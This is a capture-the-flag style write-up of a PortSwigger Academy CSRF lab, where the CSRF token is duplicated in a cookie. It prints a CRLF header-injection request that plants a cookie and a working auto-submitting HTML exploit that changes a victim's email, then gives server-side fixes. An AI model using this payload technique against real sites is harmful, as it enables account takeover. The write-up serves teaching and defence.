# Lab Write-Up: CSRF - Where the token is duplicated in Cookie

**Platform:** PortSwigger Web Security Academy  
**Vulnerability:** Cross-Site Request Forgery (CSRF)  
**Difficulty:** PRACTITIONER
---


## 1. Executive Summary / Objective

* **Goal:** Extension of the CSRF vulnerability with no defense lab. Here, the objective is to find the flaw where the CSRF token is duplicated in the csrf cookie.
* **Vulnerability Type:** OWASP A01:2021 – Broken Access Control / Cross-Site Request Forgery.
* **Root Cause:** This site provides an account email update feature with anti-CSRF tokens. However, a critical logical flaw exists: the CSRF token is duplicated in the csrf cookie. While the application generates a random CSRF token for each user, it duplicates it in the csrf cookie thus allowing the user to exploit any available cookie injection vulnerability.

---

## 2. Analysis & Discovery

### Spotting the Attack Surface
Similar to previous CSRF labs, I analyzed state-changing actions across the user profile interface (such as posting comments, user login, updating profile information, and search functionality). The email update mechanism emerged as a primary target. The request generated by it consisted of an anti-CSRF token but I found that it was duplicated in the cookie.
The search menu emerged as a secondary target. From the interception of its request, it was found that this functionality induced a `Set-Cookie` header to set a cookie for the last-searched item, thus emerging as a surface for potential injection.

### Reading the Clues
1. **[State-Changing Action]:** The `/my-account/change-email` endpoint handles a permanent, unauthorized, sensitive change to user data.
2. **[Session + Token-Based Authentication]:** The application relies entirely on the `session` cookie and anti-CSRF token to authenticate the identity of the user initiating the request.
3. **[Lack of SameSite Attribute]:** No modern security measures, like `SameSite` flags (`Strict` or `Lax`) for session cookies, meaning the browser can attach cookies to cross-site requests initiated by third-party domains.
4. **[Method Flaw- duplication]:** The intercepted request clearly showed that the csrf-token and the csrf cookie both had the same value. To test this I changed both of them to `value = fake`  (like this `email=test%40gmail.com&csrf=fake` and  `Cookie: csrf=fake; session=GeTmyrGLa6lh68npta7nNBfRaBPjAx6J`). It returned `HTTP/2 302 Found` , thus proving vulnerable.
5. **[Search Functionality]:** I intercepted the search menu request and found it induces a `Set-Cookie` header to set a cookie for `last-searched-item`, thus emerging as a surface for an attacker to inject a cookie into the victim's browser.

## 3. Exploitation

### Step 1 — Moving to the Exploit Server and Initial 
Testing
The lab also provided an exploit server that serves as the *"attacker's malicious website"*. I navigated to it and opened the HTML body editor.

I checked the intercepted request for email-update for the following vulnerabilities:
1. Check if token absence can provide a bypass — but it failed since it returned a `403 Forbidden` response.
2. Check if changing the request method works — but it failed since it returned a `405 Method Not Allowed` response.

### Step 2 —  Finding a Vulnerable Endpoint for Cookie Injection
I navigated to the other features on the home page. The search functionality was found to be one.
I updated the intercepted request to check if it allows for the setting of cookies:

```http
GET /?search=hat%0d%0aSet-Cookie:%20csrfKey=SQm00rmRtPeICyLnTlJYJfGSrdmoUbft HTTP/2
```
This endpoint would allow me to set a cookie in the victim's browser.

### Step 3 — Crafting the Exploit Payload
Since the email update functionality was CSRF-vulnerable I crafted the following exploit payload:

```html
<form action="https://0a9d009504d206518124665500e70008.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacked@gmail.com">
    <input type="hidden" name="csrf" value="fake">
</form>
<img style="display:none;" src="https://0a9d009504d206518124665500e70008.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

**Payload Breakdown:**
* **[Form tag]:** The target URL points to the vulnerable application's endpoint. The `method="POST"` is declared to force the browser to make a POST request.
* **[input type="hidden" - csrf]:** Pre-fills the CSRF token field with the same value as the value of csrf cookie sent via the img tag; the victim never sees it.
* **[img tag]:** The image tag is used to make a `GET` request to the vulnerable search endpoint for cookie injection. The `Set-Cookie` header contains the `csrf` taken from the attacker's browser, and the `onerror` handler auto-submits the form once the cookie has been set.

### Step 4 — Deliver and Verify
I saved the exploit on the exploit server and used the **"Deliver to victim"** option to simulate the victim visiting the page. The server processed the forged request and updated the victim's email — the lab was solved.

## 4. Remediation

To mitigate this vulnerability, developers must ensure that CSRF tokens are securely validated against a server-side session, rather than blindly trusting and matching client-supplied cookies.

### Fix 1 — Strict Server-Side Token Validation
The application should generate a cryptographically strong, unpredictable CSRF token, store it securely in the user's server-side session data, and include it in state-changing requests (e.g., as a hidden form field). Upon submission, the server must verify that the submitted token strictly matches the one stored in the user's session, instead of simply comparing it to another cookie value.

```javascript
app.post('/my-account/change-email', (req, res) => {
    const submittedToken = req.body.csrf;
    const sessionToken = req.session.csrfToken;
    
    // Validate that the token exists and strictly matches the server-side session
    if (!submittedToken || submittedToken !== sessionToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Process the email change securely
});
```

### Fix 2 — [Secondary / Defense-in-Depth Strategy]
To provide protection even if application-layer validation fails, session cookies must be hardened with modern browser security flags. Setting the `SameSite` attribute prevents the browser from automatically sending authentication context during unauthorized cross-site transitions.

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**In short:** Relying on client-controlled values (like a cookie parameter) for security validation is dangerous; always anchor security mechanisms like CSRF tokens to a trusted server-side session state.
